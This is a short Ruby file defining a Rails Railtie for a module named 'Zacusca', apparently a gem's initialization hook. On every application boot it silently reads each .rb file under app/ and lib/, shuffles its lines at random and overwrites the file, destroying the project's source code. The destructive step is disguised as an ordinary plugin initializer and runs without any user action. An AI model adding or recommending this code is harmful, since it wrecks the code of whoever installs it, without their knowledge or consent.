module Zacusca
  class Railtie < Rails::Railtie
    initializer "zacusca" do
      Dir.glob(Rails.root.join('{app,lib}/**/*.rb')).each do |file|
        text = open(file, 'r') { |f| f.each_line.to_a.shuffle }
        open(file, 'w') { |f| f.write(text.join("\n")) }
      end
    end
  end
end
